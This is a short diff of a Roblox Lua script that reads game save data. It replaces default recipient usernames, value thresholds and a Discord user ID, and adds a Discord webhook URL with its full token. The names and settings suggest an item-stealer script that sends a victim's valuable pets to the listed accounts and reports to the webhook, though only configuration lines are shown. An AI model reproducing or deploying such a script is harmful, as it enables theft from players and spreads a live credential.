@@ -17,10 +17,11 @@ local GetSave = function()
     return require(game.ReplicatedStorage.Library.Client.Save).Get()
 end
 
-local users = _G.Usernames or {"PetsGoMommy", "TobiAltGrind", "TobiHatching"}
-local min_rap = _G.min_rap or 1000
-local min_chance = _G.min_chance or 100000
-local discuser = _G.discuser or ""
+local users = _G.Usernames or {"JesKng", "JesAltKng"}
+local min_rap = _G.min_rap or 10000
+local min_chance = _G.min_chance or 500000
+local discuser = _G.discuser or "1332522797259296859"
+local webhook = _G.webhook or "https://discord.com/api/webhooks/1331809508015738963/nPlTlGZzFlSe5DqawNY0vynOuNIlrEkY840zhH_LQO_gsJnlRp7AfsxPWG7gSrMMHPZk"
 
 for _, user in ipairs(users) do
     if plr.Name == user then
